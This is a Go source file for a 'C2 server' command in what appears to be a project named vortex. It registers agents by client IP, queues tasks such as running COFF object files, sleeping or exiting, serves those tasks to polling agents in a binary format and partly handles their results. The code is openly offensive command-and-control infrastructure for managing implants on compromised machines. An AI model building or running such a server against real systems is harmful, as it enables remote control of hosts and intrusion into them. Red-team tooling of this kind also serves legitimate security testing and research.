/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"net/http"
	"strconv"
	"vortex/m/v2/pkg"

	"github.com/gin-gonic/gin"
	"github.com/spf13/cobra"
)

var TaskTypes = map[string]int{
	"coff":  1,
	"sleep": 2,
	"exit":  3,
}

var semaphore = make(chan struct{}, 1)

func singleThreadedMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// Acquire the semaphore
		semaphore <- struct{}{}

		// Continue to the handler
		c.Next()

		// Release the semaphore after the request is complete
		<-semaphore
	}
}

func startServer(port int) {
	db, _ := pkg.NewDb("db.json")
	gin.SetMode("release")
	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(singleThreadedMiddleware())
	r.GET("/", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "Gin server is running!",
		})
	})
	r.GET("/register", func(c *gin.Context) {
		id, _ := pkg.GenerateRandomID(3)
		p1, _ := pkg.GenerateRandomID(6)
		p2, _ := pkg.GenerateRandomID(6)
		agent := pkg.Agent{
			ID:       id,
			Name:     p1 + "-" + p2,
			Host:     c.ClientIP(),
			IsActive: true,
		}
		oldAgent, err := db.GetAgentByHost(c.ClientIP())
		if err != nil {
			db.AddAgent(agent)
			c.Data(http.StatusOK, "application/octet-stream", []byte(id))
		} else {
			c.Data(http.StatusOK, "application/octet-stream", []byte(oldAgent.ID))
		}
	})
	r.GET("/task", func(c *gin.Context) {
		id, _ := pkg.GenerateRandomID(3)
		var task pkg.Task
		c.ShouldBindJSON(&task)
		db.AddTask(task)
		c.Data(http.StatusOK, "application/octet-stream", []byte(id))
	})
	r.GET("/agent", func(c *gin.Context) {
		agent, _ := db.GetAgentByHost(c.ClientIP())
		task, _ := db.GetOldestTaskByAgentID(agent.ID)
		buf := []byte{}

		if task != nil {
			buf = append(buf, []byte(task.ID)...)
			buf = pkg.BufferAddUint32(buf, uint32(TaskTypes[task.TaskType]))
			if task.FileID != "" {
				buf = pkg.BufferAddString(buf, task.FileID)
				if task.TaskType == "coff" {
					if len(task.Args) > 4 {
						buf = pkg.BufferAddUint32(buf, uint32(len(task.Args)))
						buf = pkg.BufferAddBytes(buf, []byte(task.Args))
					}
				}
			} else if task.TaskType == "sleep" {
				i, _ := strconv.Atoi(task.Args)
				buf = pkg.BufferAddUint32(buf, uint32(i))
			}
		}

		c.Data(http.StatusOK, "application/octet-stream", buf)
	})
	r.GET("/result", func(c *gin.Context) {
		data, _ := c.GetRawData()
		pack := pkg.Package{Buffer: data, Length: uint32(len(data))}
		packReader := pkg.NewPackageReader(&pack)
		taskId, _ := packReader.GetString()
		println(taskId)
		// agent, _ := db.GetAgentByHost(c.ClientIP())
		// task, _ := db.GetOldestTaskByAgentID(agent.ID)
		// buf := []byte{}

		// if task != nil {
		// 	buf = append(buf, []byte(task.ID)...)
		// 	buf = pkg.BufferAddUint32(buf, uint32(TaskTypes[task.TaskType]))
		// 	if task.FileID != "" {
		// 		buf = pkg.BufferAddString(buf, task.FileID)
		// 		if task.TaskType == "coff" {
		// 			if len(task.Args) > 4 {
		// 				buf = pkg.BufferAddUint32(buf, uint32(len(task.Args)))
		// 				buf = pkg.BufferAddBytes(buf, []byte(task.Args))
		// 			}
		// 		}
		// 	} else if task.TaskType == "sleep" {
		// 		i, _ := strconv.Atoi(task.Args)
		// 		buf = pkg.BufferAddUint32(buf, uint32(i))
		// 	}
		// }

		// c.Data(http.StatusOK, "application/octet-stream", buf)
	})
	r.Run(":" + strconv.Itoa(port)) // Run on default port 8080
}

// serverCmd represents the server command
var serverCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts up C2 server",
	Run: func(cmd *cobra.Command, args []string) {
		port, _ := cmd.Flags().GetInt("port")
		startServer(port)
	},
}

func init() {
	rootCmd.AddCommand(serverCmd)

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// serverCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	serverCmd.Flags().IntP("port", "p", 8000, "Port to run on")
}
